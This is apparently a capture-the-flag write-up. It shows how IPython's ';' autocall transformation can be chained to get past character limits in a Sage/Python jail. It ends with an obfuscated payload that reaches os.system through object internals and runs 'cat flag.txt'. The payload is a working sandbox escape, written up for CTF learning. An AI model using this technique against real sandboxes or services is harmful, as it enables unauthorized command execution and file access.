# slide to the right solve

the real helper isnt in sage (ok maybe preparse.py can help but i haven't found a way to make it useful here)

its in ipython, [here](https://github.com/ipython/ipython/blob/main/IPython/core/inputtransformer2.py#L343)

whenever you type in `;` at the start of an input in ipython, it is transformed like so

```
quasar@quasar098:~$ sage
┌────────────────────────────────────────────────────────────────────┐
│ SageMath version 9.5, Release Date: 2022-01-30                     │
│ Using Python 3.10.12. Type "help()" for help.                      │
└────────────────────────────────────────────────────────────────────┘
sage: ;print hello
hello
sage: ;a b c d e
---------------------------------------------------------------------------
NameError                                 Traceback (most recent call last)
<ipython-input-2-3965cac02714> in <module>
----> 1 a("b c d e")

NameError: name 'a' is not defined
sage:
```

we can chain multiple `;` and use the `)` and `"` to fix things up also. here is a larger example to give an idea of what is going on

```
sage: ;;;;a# b c d e
---------------------------------------------------------------------------
NameError                                 Traceback (most recent call last)
<ipython-input-14-9c5361a150e8> in <module>
----> 1 a#("b("c("d("e")")")")

NameError: name 'a' is not defined
```

so the basic rules for a payload are that all `(` must be followed by `"`, and to convert from a normal working python payload
into one that works for this challenge, we can replace each `("` by a space and place a `;` at the beginning of the payload

for convenience, i made a text format wizard script that does this (copy paste link into urlbar of new browser tab since it is huge)

```
https://quasar.name/text-format-wizard/#eyJyZWNpcGUiOlt7Im1vZHVsZVR5cGUiOiI4MzdkMDdiMi1hMzIxLTUyMzYtOWZiOC0xOTgwMWUxOTc1NWIiLCJhcmdzIjp7ImZvcm1hdCI6ImJhZCIsInJlbW92ZSI6Ii4qXFwoW15cIl0uKiJ9fSx7Im1vZHVsZVR5cGUiOiJlNWNjMWM4Yi02MjA3LTVjZjQtOTMzZS1jYzA2YjdlNjBiNmQiLCJhcmdzIjp7ImZvcm1hdCI6IiUwJSIsInJlZ2V4IjoiKC4rPykoXFwoXCJ8JCkifX0seyJtb2R1bGVUeXBlIjoiMDU1NGE1NWMtMjFlNi01OWFhLTk5YjMtYzU5NTQ2ZTU2ODRjIiwiYXJncyI6eyJuYW1lIjoicmVnIn19LHsibW9kdWxlVHlwZSI6Ijg2MjViMjYyLTI0YzQtNTM4Yi04MWMyLTI5MDY5YzU3OTcyZCIsImFyZ3MiOnt9fSx7Im1vZHVsZVR5cGUiOiIwNTU0YTU1Yy0yMWU2LTU5YWEtOTliMy1jNTk1NDZlNTY4NGMiLCJhcmdzIjp7Im5hbWUiOiJhbXQifX0seyJtb2R1bGVUeXBlIjoiY2M2MzgyNTUtNTBiNy01YjRiLThmMmYtY2Y1ZjFlMmI0ODE0IiwiYXJncyI6e319LHsibW9kdWxlVHlwZSI6IjcxNzY0YjY2LTgyMjctNWEyZC1hYmU3LTUzNDMxZmQ4ZDdiNyIsImFyZ3MiOnsiYXBwZW5kIjoiOyJ9fSx7Im1vZHVsZVR5cGUiOiIzNDE4ZWM2Ni01ODM2LTViOWYtYmQ1NC04MjMzMmYzNTI0NTYiLCJhcmdzIjp7ImFtb3VudCI6IiV2YW10JSJ9fSx7Im1vZHVsZVR5cGUiOiI3MTc2NGI2Ni04MjI3LTVhMmQtYWJlNy01MzQzMWZkOGQ3YjciLCJhcmdzIjp7ImFwcGVuZCI6IiV2cmVnJSJ9fSx7Im1vZHVsZVR5cGUiOiI4MzdkMDdiMi1hMzIxLTUyMzYtOWZiOC0xOTgwMWUxOTc1NWIiLCJhcmdzIjp7ImZvcm1hdCI6IiAiLCJyZW1vdmUiOiJcXG4ifX1dLCJpbnB1dCI6IlwiXCIuX19jbGFzc19fLnNwbGl0KFwiXCIpLl9fY2xhc3NfXyhcIlwiKSMgPC0tIGdldCBsaXN0IGNsYXNzLCBmb3IgZXhhbXBsZSJ9
```

the final final payload is

```
;;;;;;;;;"".__class__.__class__.__subclasses__ ".__class__).pop ".__class__.__itemsize__).__class__.__new__.__globals__.__getitem__ sys").modules.__getitem__ os").system cat".__add__ ".__doc__.__getitem__ "or"".__class__.__len__ classclassabcd"))).__add__ flag.txt"))#
```

overall, this payload does `type.__subclasses__(str)[0].__class__.__new__.__globals__['sys'].modules['os'].system('cat flag.txt')`

which is pretty standard

i hope the length restriction wasnt too strict, i think its fairly lenient probably? but idk

